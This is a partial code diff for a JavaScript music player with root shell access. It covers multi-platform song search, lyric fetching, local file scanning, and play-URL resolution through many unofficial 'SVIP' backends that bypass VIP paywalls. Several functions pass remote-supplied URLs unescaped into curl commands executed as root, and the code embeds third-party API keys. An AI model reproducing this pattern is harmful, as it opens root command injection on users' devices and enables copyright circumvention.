+                    _searchResults = _searchResults.concat(songs)
+                    renderSearchResults()
+                }
+                _searchStatus.kuwo = 'done'
+                updatePlatformButtons()
+                return songs
+            } catch(e) {
+                _searchStatus.kuwo = 'failed'
+                updatePlatformButtons()
+                return []
+            }
+        }
+
+        // 咪咕搜索
+        var searchMigu = async function(keyword) {
+            try {
+                var text = await shellCurl(
+                    'https://m.music.migu.cn/migu/remoting/scr_search_tag?rows=15&type=2&keyword=' + encodeURIComponent(keyword) + '&pgc=1',
+                    "-H 'Referer: https://m.music.migu.cn/' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10)'"
+                )
+                if (!text) throw new Error('无返回')
+                var data = JSON.parse(text)
+                var songs = []
+                if (data && data.musics) {
+                    songs = data.musics.map(function(s) {
+                        return {
+                            id: 'mg_' + (s.copyrightId || s.id || ''),
+                            platform: 'migu',
+                            pfName: '咪咕',
+                            songId: s.copyrightId || s.id || '',
+                            name: s.songName || s.title || '',
+                            artists: s.singerName ? s.singerName.split('、') : [],
+                            album: s.albumName || '',
+                            duration: (s.duration || 0) * 1000
+                        }
+                    })
+                    _searchResults = _searchResults.concat(songs)
+                    renderSearchResults()
+                }
+                _searchStatus.migu = 'done'
+                updatePlatformButtons()
+                return songs
+            } catch(e) {
+                _searchStatus.migu = 'failed'
+                updatePlatformButtons()
+                return []
+            }
+        }
+
+        // 获取播放地址
+        // ---- 提取URL的辅助函数 ----
+        var extractPlayUrl = function(obj, paths) {
+            for (var p = 0; p < paths.length; p++) {
+                var val = obj
+                for (var k = 0; k < paths[p].length; k++) {
+                    if (val == null) { val = undefined; break }
+                    val = val[paths[p][k]]
+                }
+                if (Array.isArray(val)) val = val[0]
+                if (typeof val === 'string' && (val.indexOf('http://') === 0 || val.indexOf('https://') === 0)) return val
+                if (typeof val === 'string' && val.indexOf('//') === 0) return 'https:' + val
+            }
+            return ''
+        }
+
+        // ---- 验证音频URL是否可访问且为音频内容 ----
+        var validateAudioUrl = async function(url) {
+            if (!url) return false
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return true  // 无shell权限无法验证，默认通过
+            try {
+                // 用 curl -sI 做HEAD请求检查 Content-Type，-L 跟随重定向
+                var cmd = "curl -sI --max-time 6 -L '" + url + "' 2>/dev/null | head -30"
+                var res = await _rs(cmd)
+                var text = (res && res.content || '').trim()
+                if (!text) return true  // 无返回，不确定，默认通过
+
+                // 检查 HTTP 状态码（取最后一次重定向的状态）
+                var statusLines = text.match(/HTTP\/[\d.]+\s+(\d{3})/gi) || []
+                var lastStatus = statusLines.length ? parseInt(statusLines[statusLines.length - 1].replace(/HTTP\/[\d.]+\s+/i, '')) : 0
+                if (lastStatus >= 400 && lastStatus < 600) return false  // 4xx/5xx 错误
+
+                // 检查 Content-Type
+                var ctMatch = text.match(/Content-Type:\s*([^\r\n]+)/i)
+                if (ctMatch) {
+                    var ct = ctMatch[1].trim().toLowerCase()
+                    // 明确是音频类型
+                    if (ct.indexOf('audio') >= 0 || ct.indexOf('octet-stream') >= 0 || ct.indexOf('mpeg') >= 0) return true
+                    // 明确是HTML错误页面
+                    if (ct.indexOf('text/html') >= 0 || ct.indexOf('text/plain') >= 0) return false
+                }
+                return true  // 无法确定，默认通过
+            } catch(e) {
+                return true  // 验证失败，默认通过
+            }
+        }
+
+        // ---- 墨澜聚合音源 API后端（curl GET方式） ----
+        // 每个平台多个后端，逐个尝试，哪个成功用哪个
+        var NETEASE_BACKENDS = [
+            // 1. 笒鬼鬼API
+            { url: function(id) { return 'https://api.cenguigui.cn/api/netease/music_v1.php?id=' + id + '&type=json&level=exhigh' }, extract: [['data','url'],['url']] },
+            // 2. 溯音API
+            { url: function(id) { return 'https://oiapi.net/api/Music_163?id=' + id + '&type=json' }, extract: [['url'],['data','url'],['data',0,'url']] },
+            // 3. GD Studio
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?types=url&source=netease&id=' + id + '&br=320' }, extract: [['url']] },
+            // 4. 星海主后端
+            { url: function(id) { return 'https://yy.zddyr.top/lx/api/?source=netease&songmid=' + id + '&quality=320k' }, extract: [['url']] },
+            // 5. 妖狐API
+            { url: function(id) { return 'https://api.yaohud.cn/api/music/wyvip?id=' + id + '&level=320k' }, extract: [['url'],['data','url']] },
+            // 6. 聆澜API
+            { url: function(id) { return 'https://source.shiqianjiang.cn/api/music/url?source=wy&songId=' + id + '&quality=320k' }, extract: [['url'],['data','url']] },
+            // 7. HYWmusic
+            { url: function(id) { return 'http://103.79.184.97/api/music/url?source=wy&songId=' + id + '&quality=320k&key=MOLAN-BAIJI' }, extract: [['url'],['data','url']], headers: 'X-Card-Key: MOLAN-BAIJI' },
+            // 8. 长青SVIP
+            { url: function(id) { return 'http://175.27.166.236/wy/wy.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            // 9. 念心SVIP
+            { url: function(id) { return 'http://music.nxinxz.com/wy.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            // 10. 星海主API（聚合音源版）
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?use_xbridge3=true&loader_name=forest&need_sec_link=1&sec_link_scene=im&theme=light&types=url&source=netease&id=' + id + '&br=320' }, extract: [['url']] },
+        ]
+
+        var QQ_BACKENDS = [
+            // 1. 星海主后端
+            { url: function(id) { return 'https://yy.zddyr.top/lx/api/?source=qq&songmid=' + id + '&quality=320k' }, extract: [['url']] },
+            // 2. 溯音QQ
+            { url: function(id) { return 'https://oiapi.net/api/QQ_Music?key=oiapi-ef6133b7-ac2f-dc7d-878c-d3e207a82575&type=json&br=5&n=1&mid=' + id }, extract: [['data','music'],['data','url'],['url']] },
+            // 3. GD Studio
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?types=url&source=qq&id=' + id + '&br=320' }, extract: [['url']] },
+            // 4. 妖狐API
+            { url: function(id) { return 'https://api.yaohud.cn/api/music/qq_plus?id=' + id + '&level=320k' }, extract: [['url'],['data','url']] },
+            // 5. HYWmusic
+            { url: function(id) { return 'http://103.79.184.97/api/music/url?source=tx&songId=' + id + '&quality=320k&key=MOLAN-BAIJI' }, extract: [['url'],['data','url']], headers: 'X-Card-Key: MOLAN-BAIJI' },
+            // 6. 聆澜API
+            { url: function(id) { return 'https://source.shiqianjiang.cn/api/music/url?source=tx&songId=' + id + '&quality=320k' }, extract: [['url'],['data','url']] },
+            // 7. 长青SVIP
+            { url: function(id) { return 'http://175.27.166.236/kgqq/qq.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            // 8. 念心SVIP
+            { url: function(id) { return 'https://music.nxinxz.com/kgqq/tx.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            // 9. 星海主API（聚合音源版）
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?use_xbridge3=true&loader_name=forest&need_sec_link=1&sec_link_scene=im&theme=light&types=url&source=tencent&id=' + id + '&br=320' }, extract: [['url']] },
+        ]
+
+        var KUGOU_BACKENDS = [
+            // 1. 长青海棠
+            { url: function(id) { return 'https://musicserver.haitangw.cc/v1/music/resolve-url' }, extract: [['data','url']], method: 'POST', postBody: function(id) { return '{"source":"kg","rid":"' + id + '","level":"exhigh"}' } },
+            // 2. 海棠API
+            { url: function(id) { return 'https://musicapi.haitangw.net/kgqq/kg.php?type=json&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            // 3. 酷狗官方
+            { url: function(id, albumId) { return 'https://wwwapi.kugou.com/yy/index.php?r=play/getdata&hash=' + id + '&platid=4&album_id=' + (albumId||'') + '&mid=00000000000000000000000000000000' }, extract: [['data','play_url'],['data','play_backup_url']] },
+            // 4. GD Studio
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?types=url&source=kg&id=' + id + '&br=320' }, extract: [['url']] },
+            // 5. 妖狐API
+            { url: function(id) { return 'https://api.yaohud.cn/api/music/kgvip?id=' + id + '&level=320k' }, extract: [['url'],['data','url']] },
+            // 6. 聆澜API
+            { url: function(id) { return 'https://source.shiqianjiang.cn/api/music/url?source=kg&songId=' + id + '&quality=320k' }, extract: [['url'],['data','url']] },
+            // 7. HYWmusic
+            { url: function(id) { return 'http://103.79.184.97/api/music/url?source=kg&songId=' + id + '&quality=320k&key=MOLAN-BAIJI' }, extract: [['url'],['data','url']], headers: 'X-Card-Key: MOLAN-BAIJI' },
+            // 8. 长青SVIP
+            { url: function(id) { return 'https://music.haitangw.cc/kgqq/kg.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            // 9. 念心SVIP
+            { url: function(id) { return 'https://music.nxinxz.com/kgqq/kg.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            // 10. 星海主API（聚合音源版）
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?use_xbridge3=true&loader_name=forest&need_sec_link=1&sec_link_scene=im&theme=light&types=url&source=kugou&id=' + id + '&br=320' }, extract: [['url']] },
+        ]
+
+        // ---- 长青SVIP后端（多平台） ----
+        var CHANGQING_BACKENDS = {
+            netease: { url: function(id) { return 'http://175.27.166.236/wy/wy.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            qq: { url: function(id) { return 'http://175.27.166.236/kgqq/qq.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            kugou: { url: function(id) { return 'https://music.haitangw.cc/kgqq/kg.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            kuwo: { url: function(id) { return 'https://musicapi.haitangw.net/music/kw.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            migu: { url: function(id) { return 'https://music.haitangw.cc/musicapi/mg.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+        }
+
+        // ---- 念心SVIP后端（多平台） ----
+        var NIANXIN_BACKENDS = {
+            netease: { url: function(id) { return 'http://music.nxinxz.com/wy.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            qq: { url: function(id) { return 'https://music.nxinxz.com/kgqq/tx.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            kugou: { url: function(id) { return 'https://music.nxinxz.com/kgqq/kg.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            kuwo: { url: function(id) { return 'http://music.nxinxz.com/kw.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            migu: { url: function(id) { return 'http://music.nxinxz.com/mg.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+        }
+
+        // ---- 溯音酷我后端 ----
+        var SUYIN_KUWO_BACKENDS = [
+            // 1. 溯音酷我（搜索方式，用歌名搜索获取URL）
+            { url: function(id, albumId, song) {
+                if (!song || !song.name) return null
+                var kw = encodeURIComponent((song.artists || []).join('') + song.name)
+                return 'https://oiapi.net/api/Kuwo?msg=' + kw + '&n=1&br=1&type=json'
+              }, extract: [['data','url'],['url']], needSong: true },
+        ]
+
+        // ---- 溯音咪咕后端 ----
+        var SUYIN_MIGU_BACKENDS = [
+            { url: function(id, albumId, song) {
+                if (!song || !song.name) return null
+                var kw = encodeURIComponent(song.name + (song.artists && song.artists.length ? song.artists[0] : ''))
+                return 'https://api.xcvts.cn/api/music/migu?gm=' + kw + '&n=1&num=1&type=json'
+              }, extract: [['musicInfo'],['url']], needSong: true },
+        ]
+
+        // ---- 酷我后端 ----
+        var KUWO_BACKENDS = [
+            // 1. 酷我官方
+            { url: function(id) { return 'http://www.kuwo.cn/url?format=mp3&rid=MUSIC_' + id + '&type=convert_url3&br=320kmp3' }, extract: [['url'],['data','url']] },
+            // 2. 长青SVIP
+            { url: function(id) { return 'https://musicapi.haitangw.net/music/kw.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            // 3. 念心SVIP
+            { url: function(id) { return 'http://music.nxinxz.com/kw.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            // 4. 溯音酷我搜索
+            { url: function(id, albumId, song) {
+                if (!song || !song.name) return null
+                var kw = encodeURIComponent((song.artists || []).join('') + song.name)
+                return 'https://oiapi.net/api/Kuwo?msg=' + kw + '&n=1&br=1&type=json'
+              }, extract: [['data','url'],['url']], needSong: true },
+            // 5. GD Studio
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?types=url&source=kuwo&id=' + id + '&br=320' }, extract: [['url']] },
+            // 6. 星海主
+            { url: function(id) { return 'https://music-api.gdstudio.xyz/api.php?use_xbridge3=true&loader_name=forest&need_sec_link=1&sec_link_scene=im&theme=light&types=url&source=kuwo&id=' + id + '&br=320' }, extract: [['url']] },
+        ]
+
+        // ---- 咪咕后端 ----
+        var MIGU_BACKENDS = [
+            // 1. 咪咕官方
+            { url: function(id) { return 'https://music.migu.cn/v3/api/music/audioUrl?songId=' + id + '&channel=0&netType=1&playMode=1' }, extract: [['data','url'],['url']] },
+            // 2. 念心SVIP
+            { url: function(id) { return 'http://music.nxinxz.com/mg.php?id=' + id + '&level=exhigh&type=mp3' }, extract: [['url'],['data','url']] },
+            // 3. 长青SVIP
+            { url: function(id) { return 'https://music.haitangw.cc/musicapi/mg.php?type=mp3&id=' + id + '&level=exhigh' }, extract: [['url'],['data','url']] },
+            // 4. 溯音咪咕搜索
+            { url: function(id, albumId, song) {
+                if (!song || !song.name) return null
+                var kw = encodeURIComponent(song.name)
+                return 'https://api.xcvts.cn/api/music/migu?gm=' + kw + '&n=1&num=1&type=json'
+              }, extract: [['musicInfo'],['url']], needSong: true },
+        ]
+
+        // ---- 汽水VIP后端（跨平台搜索+获取） ----
+        var QISHUI_API = 'https://api.vsaa.cn/api/music.qishui.vip'
+        var QISHUI_API_HTTP = 'http://api.vsaa.cn/api/music.qishui.vip'
+        var QISHUI_PROXY_API = 'https://proxy.qishui.vsaa.cn/qishui/proxy'
+
+        var getPlayUrl = async function(song) {
+            if (!song || !song.platform) return ''
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) {
+                // 无shell权限时，网易云还能用直链
+                if (song.platform === 'netease') {
+                    return 'https://music.163.com/song/media/outer/url?id=' + song.songId + '.mp3'
+                }
+                return ''
+            }
+
+            var backends = []
+            var songId = song.songId || ''
+            var albumId = song.albumId || ''
+
+            if (song.platform === 'netease') {
+                backends = NETEASE_BACKENDS
+            } else if (song.platform === 'qq') {
+                backends = QQ_BACKENDS
+            } else if (song.platform === 'kugou') {
+                backends = KUGOU_BACKENDS
+            } else if (song.platform === 'kuwo') {
+                backends = KUWO_BACKENDS
+            } else if (song.platform === 'migu') {
+                backends = MIGU_BACKENDS
+            }
+
+            if (!backends.length) return ''
+
+            for (var i = 0; i < backends.length; i++) {
+                var backend = backends[i]
+                try {
+                    var apiUrl = backend.url(songId, albumId, song)
+                    if (!apiUrl) continue  // needSong类型的后端可能返回null
+                    var hdr = backend.headers ? '-H \'' + backend.headers + '\'' : "-H 'User-Agent: Mozilla/5.0'"
+                    var text
+
+                    if (backend.method === 'POST' && backend.postBody) {
+                        var body = backend.postBody(songId)
+                        text = await shellCurl(apiUrl, hdr + " -X POST -H 'Content-Type: application/json' -d '" + body.replace(/'/g, "'\\''") + "'")
+                    } else {
+                        text = await shellCurl(apiUrl, hdr)
+                    }
+
+                    if (!text) continue
+
+                    var data
+                    try { data = JSON.parse(text) } catch(e) { continue }
+                    if (!data) continue
+
+                    // 提取URL
+                    var playUrl = extractPlayUrl(data, backend.extract)
+
+                    // 如果返回的URL没有http前缀但有url字段
+                    if (!playUrl && data.url && typeof data.url === 'string' && data.url.indexOf('http') === 0) {
+                        playUrl = data.url
+                    }
+                    if (!playUrl && data.data && data.data.url && typeof data.data.url === 'string' && data.data.url.indexOf('http') === 0) {
+                        playUrl = data.data.url
+                    }
+                    // 汽水VIP的musicInfo字段
+                    if (!playUrl && data.musicInfo && typeof data.musicInfo === 'string' && data.musicInfo.indexOf('http') === 0) {
+                        playUrl = data.musicInfo
+                    }
+
+                    if (playUrl) {
+                        // 验证URL是否可访问且为音频内容
+                        var isValid = await validateAudioUrl(playUrl)
+                        if (isValid) {
+                            aiLogSafe('[' + song.pfName + '] ' + (backend.name || '后端' + (i+1)) + ' 获取成功', 'success')
+                            return playUrl
+                        }
+                        // URL无效，继续尝试下一个后端
+                        aiLogSafe('[' + song.pfName + '] ' + (backend.name || '后端' + (i+1)) + ' URL无效或已过期，尝试下一个', 'warn')
+                    }
+                } catch(e) {
+                    // 继续尝试下一个后端
+                    continue
+                }
+            }
+
+            // 所有后端都失败，尝试汽水VIP搜索回退
+            try {
+                var qishuiUrl = await qishuiFallbackGetUrl(song)
+                if (qishuiUrl) {
+                    aiLogSafe('[' + song.pfName + '] 汽水VIP回退获取成功', 'success')
+                    return qishuiUrl
+                }
+            } catch(e) {}
+
+            // 所有后端都失败，网易云兜底用直链
+            if (song.platform === 'netease') {
+                return 'https://music.163.com/song/media/outer/url?id=' + song.songId + '.mp3'
+            }
+
+            return ''
+        }
+
+        // 汽水VIP跨平台搜索回退（所有平台后端失败后尝试）
+        var qishuiFallbackGetUrl = async function(song) {
+            if (!song || !song.name) return ''
+            var keyword = song.name
+            if (song.artists && song.artists.length) keyword += ' ' + song.artists.join(' ')
+            try {
+                // 搜索
+                var searchText = await shellCurl(
+                    QISHUI_API + '?act=search&keywords=' + encodeURIComponent(keyword) + '&page=1&pagesize=5&type=music',
+                    "-H 'User-Agent: Mozilla/5.0'"
+                )
+                if (!searchText) return ''
+                var searchData
+                try { searchData = JSON.parse(searchText) } catch(e) { return '' }
+                var list = searchData && searchData.data && searchData.data.lists
+                if (!list || !list.length) return ''
+
+                // 取第一条结果获取URL
+                var firstSong = list[0]
+                var qishuiId = firstSong.id || firstSong.vid || ''
+                if (!qishuiId) return ''
+
+                var urlText = await shellCurl(
+                    QISHUI_API + '?act=song&id=' + qishuiId + '&quality=low',
+                    "-H 'User-Agent: Mozilla/5.0'"
+                )
+                if (!urlText) return ''
+                var urlData
+                try { urlData = JSON.parse(urlText) } catch(e) { return '' }
+                var songData = urlData && urlData.data
+                if (Array.isArray(songData)) songData = songData[0]
+                if (songData && songData.url) {
+                    // 如果有ekey需要代理解密
+                    if (songData.ekey) {
+                        try {
+                            var proxyCmd = "curl -s --max-time 20 -X POST '" + QISHUI_PROXY_API + "' " +
+                                "-H 'Content-Type: application/json' " +
+                                "-d '{\"url\":\"" + songData.url + "\",\"key\":\"" + (songData.ekey || '') + "\",\"filename\":\"KMusic\",\"ext\":\"aac\"}' 2>/dev/null"
+                            var _rs2 = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+                            var proxyRes = _rs2 ? await _rs2(proxyCmd) : null
+                            var proxyText = (proxyRes && proxyRes.content || '').trim()
+                            if (proxyText) {
+                                var proxyJson = JSON.parse(proxyText)
+                                if (Number(proxyJson.code) === 200 && proxyJson.url) return String(proxyJson.url)
+                            }
+                        } catch(e) {}
+                    }
+                    return String(songData.url)
+                }
+            } catch(e) {}
+            return ''
+        }
+
+        var aiLogSafe = function(msg, level) {
+            try { if (typeof addDiagLog === 'function') addDiagLog(msg, level || 'info') } catch(e) {}
+        }
+
+        var escapeHtml = function(s) {
+            if (!s) return ''
+            return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;')
+        }
+
+        var showSearchLoading = function(text) {
+            var container = document.getElementById('sm_search_results')
+            if (!container) return
+            container.innerHTML = '<div class="sm-search-loading">' + (text || '🔍 搜索中...') + '</div>'
+            container.style.display = 'block'
+        }
+
+        var showSearchEmpty = function() {
+            var container = document.getElementById('sm_search_results')
+            if (!container) return
+            container.innerHTML = '<div class="sm-search-loading">未找到歌曲，试试其他关键词或平台</div>'
+            container.style.display = 'block'
+        }
+
+        var renderSearchResults = function() {
+            var container = document.getElementById('sm_search_results')
+            if (!container) return
+            if (!_searchResults.length) { showSearchEmpty(); return }
+
+            var html = ''
+            for (var i = 0; i < _searchResults.length; i++) {
+                var song = _searchResults[i]
+                var name = escapeHtml(song.name || '')
+                var artists = escapeHtml((song.artists || []).join(' / '))
+                var album = escapeHtml(song.album || '')
+                var dur = song.duration ? fmtTime(song.duration / 1000) : ''
+                var isCurrent = _currentIndex >= 0 && _playlist[_currentIndex] && _playlist[_currentIndex].pfId === song.id
+                var isFav = isFavorited(song.id)
+                html += '<div class="sm-search-item' + (isCurrent ? ' _loading' : '') + '" data-search-idx="' + i + '">' +
+                    '<div class="sm-search-info">' +
+                    '<div class="sm-search-title"><span class="sm-search-pf-tag _' + song.platform + '">' + song.pfName + '</span>' + name + (isCurrent ? ' <span class="sm-search-playing">▶ 播放中</span>' : '') + '</div>' +
+                    '<div class="sm-search-artist">' + artists + (album ? ' · ' + album : '') + '</div>' +
+                    '</div>' +
+                    '<span class="sm-fav-btn' + (isFav ? ' _active' : '') + '" data-fav-toggle="' + i + '" title="收藏">' + (isFav ? '❤️' : '🤍') + '</span>' +
+                    '<span class="sm-search-dur">' + dur + '</span>' +
+                    '</div>'
+            }
+            container.innerHTML = html
+            container.style.display = 'block'
+        }
+
+        var playSearchSong = async function(song) {
+            if (!song || !song.id) return
+            var title = (song.artists && song.artists.length ? song.artists.join(' / ') + ' - ' : '') + (song.name || '未知歌曲')
+
+            // 检查是否已在播放列表
+            for (var i = 0; i < _playlist.length; i++) {
+                if (_playlist[i].pfId === song.id) {
+                    loadSong(i)
+                    play()
+                    renderSearchResults()
+                    return
+                }
+            }
+
+            showToast('正在获取播放地址...', 'pink', 2000)
+
+            // 获取真实播放地址
+            var playUrl = await getPlayUrl(song)
+            if (!playUrl) {
+                showToast('获取播放地址失败，该歌曲可能需要VIP', 'red', 4000)
+                return
+            }
+
+            // 添加到播放列表
+            _playlist.push({ url: playUrl, title: title, lrc: '', pfId: song.id, platform: song.platform, songRef: song })
+            savePlaylist()
+            renderPlaylist()
+
+            // 加载并播放
+            loadSong(_playlist.length - 1)
+            play()
+            renderSearchResults()
+
+            showToast('正在播放: ' + title, 'green', 2500)
+
+            // 异步获取歌词
+            fetchLyricsForSong(song)
+        }
+
+        var fetchLyricsForSong = async function(song) {
+            var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+            if (!_rs) return
+
+            try {
+                var lrcText = ''
+
+                if (song.platform === 'netease') {
+                    var text = await shellCurl(
+                        'https://music.163.com/api/song/lyric?id=' + song.songId + '&lv=1&tv=-1',
+                        "-H 'Referer: https://music.163.com' -H 'User-Agent: Mozilla/5.0'"
+                    )
+                    if (text) {
+                        var data = JSON.parse(text)
+                        if (data.lrc && data.lrc.lyric) lrcText = data.lrc.lyric
+                    }
+                } else if (song.platform === 'qq') {
+                    var text = await shellCurl(
+                        'https://c.y.qq.com/lyric/fcgi-bin/fcg_query_lyric_new.fcg?songmid=' + song.songId + '&format=json',
+                        "-H 'Referer: https://y.qq.com' -H 'User-Agent: Mozilla/5.0'"
+                    )
+                    if (text) {
+                        if (text.charAt(0) !== '{') {
+                            var s = text.indexOf('{'), e = text.lastIndexOf('}')
+                            if (s >= 0 && e > s) text = text.substring(s, e + 1)
+                        }
+                        var data = JSON.parse(text)
+                        if (data && data.lyric) {
+                            // QQ歌词是base64的
+                            try { lrcText = atob(data.lyric) } catch(e) { lrcText = data.lyric }
+                        }
+                    }
+                } else if (song.platform === 'kugou') {
+                    var text = await shellCurl(
+                        'https://wwwapi.kugou.com/yy/index.php?r=play/getdata&hash=' + song.songId + '&album_id=' + (song.albumId || ''),
+                        "-H 'Referer: https://www.kugou.com' -H 'User-Agent: Mozilla/5.0'"
+                    )
+                    if (text) {
+                        var data = JSON.parse(text)
+                        if (data && data.data && data.data.lyrics) lrcText = data.data.lyrics
+                    }
+                }
+
+                if (lrcText) {
+                    _lrcData = parseLRC(lrcText)
+                    _lrcLineIndex = -1
+
+                    if (_currentIndex >= 0 && _playlist[_currentIndex] && _playlist[_currentIndex].pfId === song.id) {
+                        _playlist[_currentIndex].lrc = lrcText
+                        savePlaylist()
+                    }
+
+                    var ta = document.getElementById('sm_lrc_textarea')
+                    if (ta) ta.value = lrcText
+
+                    updateLyricsBar()
+                }
+            } catch(e) {}
+        }
+
+        // ---- 扫描本地音乐 ----
+        var scanLocalMusic = async function() {
+            try {
+                var _rs = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+                if (!_rs) { showToast('设备 Shell 不可用', 'red'); return }
+                showToast('正在扫描本地音乐...', 'pink', 3000)
+                var dirs = ['/sdcard/Music', '/sdcard/Download', '/sdcard/music', '/sdcard/songs', '/sdcard/Audio']
+                var exts = ['mp3', 'm4a', 'wav', 'ogg', 'flac', 'aac']
+                var found = []
+                for (var d = 0; d < dirs.length; d++) {
+                    var dir = dirs[d]
+                    var extPattern = exts.map(function(e) { return '-iname "*.' + e + '"' }).join(' -o ')
+                    var cmd = 'find "' + dir + '" -type f \\( ' + extPattern + ' \\) 2>/dev/null | head -50'
+                    var res = await _rs(cmd)
+                    if (res && res.content) {
+                        var lines = res.content.trim().split('\n').filter(function(l) { return l.trim() })
+                        for (var i = 0; i < lines.length; i++) {
+                            var path = lines[i].trim()
+                            if (!path) continue
+                            var name = path.split('/').pop()
+                            // 尝试构造可播放的 URL
+                            var url = path
+                            // 检查是否已有 HTTP 前缀可用
+                            var prefix = ''
+                            try { prefix = localStorage.getItem('smart_http_prefix') || '' } catch(e) {}
+                            if (prefix) {
+                                // 将 /sdcard/ 路径映射到 HTTP 静态路径
+                                var relPath = path.replace(/^\/sdcard\//, '').replace(/^\/data\//, '')
+                                url = prefix + 'sdm_update/../' + relPath
+                            }
+                            found.push({ url: url, title: name.replace(/\.[^.]+$/, ''), lrc: '', _local: true, _path: path })
+                        }
+                    }
+                }
+                if (!found.length) {
+                    showToast('未找到本地音乐文件', 'pink', 3000)
+                    return
+                }
+                // 去重：按 URL
+                var existing = {}
+                for (var i2 = 0; i2 < _playlist.length; i2++) existing[_playlist[i2].url] = true
+                var added = 0
+                for (var j = 0; j < found.length; j++) {
+                    if (!existing[found[j].url]) {
+                        _playlist.push(found[j])
+                        added++
+                    }
+                }
+                savePlaylist()
+                renderPlaylist()
+                showToast('扫描完成，新增 ' + added + ' 首歌曲（共 ' + _playlist.length + ' 首）', 'green', 4000)
+            } catch(e) {
+                showToast('扫描失败: ' + e, 'red', 4000)
+            }
+        }
+
+        // ---- 获取远程歌词 ----
+        var fetchRemoteLRC = async function() {
+            var urlInput = document.getElementById('sm_lrc_url_input')
+            var url = (urlInput && urlInput.value || '').trim()
+            if (!url) { showToast('请输入歌词 URL', 'red'); return }
+            try {
+                showToast('正在获取歌词...', 'pink', 2000)
+                var resp = await fetch(url, { cache: 'no-store' })
+                if (!resp.ok) throw new Error('HTTP ' + resp.status)
+                var text = await resp.text()
+                var ta = document.getElementById('sm_lrc_textarea')
+                if (ta) ta.value = text
+                showToast('歌词已获取，点「应用歌词」生效', 'green', 3000)
+            } catch(e) {
+                showToast('获取歌词失败: ' + (e.message || e), 'red', 4000)
+            }
+        }
+
+        // ---- 歌词开关 ----
+        var setLyricsOverlay = function(on) {
+            _lyricsOverlayVisible = on
+            var sw = document.getElementById('sm_lyrics_toggle')
+            if (sw) { if (on) sw.classList.add('_on'); else sw.classList.remove('_on') }
+            if (on) {
+                lyricsBar.classList.add('_show')
+                updateLyricsBar()
+                // 恢复位置
+                try {
+                    var pos = localStorage.getItem('smart_music_lyrics_pos')
+                    if (pos) {
+                        var p = JSON.parse(pos)
+                        setLyricsPosition(p.x, p.y)
+                    }
+                } catch(e) {}
+            } else {
+                lyricsBar.classList.remove('_show')
+            }
+            try { localStorage.setItem('smart_music_lyrics_bar', on ? '1' : '0') } catch(e) {}
+        }
+
+        // ---- 歌词拖动功能 ----
+        var _dragState = { dragging: false, startX: 0, startY: 0, origLeft: 0, origBottom: 0, moved: false }
+        var _lyricPosX = null  // null = 居中
+        var _lyricPosY = null  // null = 默认底部20px
+
+        var setLyricsPosition = function(x, y) {
+            _lyricPosX = x
+            _lyricPosY = y
+            lyricsBar.style.left = '0'
+            lyricsBar.style.right = 'auto'
+            lyricsBar.style.bottom = 'auto'
+            lyricsBar.style.top = y + 'px'
+            lyricsBar.style.transform = 'none'
+            // 水平居中于拖动点
+            lyricsBar.style.left = x + 'px'
+            lyricsBar.style.marginLeft = '0'
+        }
+
+        var resetLyricsPosition = function() {
+            _lyricPosX = null
+            _lyricPosY = null
+            lyricsBar.style.left = '50%'
+            lyricsBar.style.right = ''
+            lyricsBar.style.bottom = '20px'
+            lyricsBar.style.top = ''
+            lyricsBar.style.transform = 'translateX(-50%)'
+            try { localStorage.removeItem('smart_music_lyrics_pos') } catch(e) {}
+        }
+
+        var onLyricDragStart = function(e) {
+            _dragState.dragging = true
+            _dragState.moved = false
+            var pt = e.touches ? e.touches[0] : e
+            _dragState.startX = pt.clientX
+            _dragState.startY = pt.clientY
+            var rect = lyricsBar.getBoundingClientRect()
+            _dragState.origLeft = rect.left + rect.width / 2  // 中心点X
+            _dragState.origBottom = rect.bottom              // 底部Y
+            lyricsBar.classList.add('_dragging')
+            e.preventDefault()
+        }
+
+        var onLyricDragMove = function(e) {
+            if (!_dragState.dragging) return
+            var pt = e.touches ? e.touches[0] : e
+            var dx = pt.clientX - _dragState.startX
+            var dy = pt.clientY - _dragState.startY
+            if (Math.abs(dx) > 3 || Math.abs(dy) > 3) _dragState.moved = true
+            var newX = _dragState.origLeft + dx
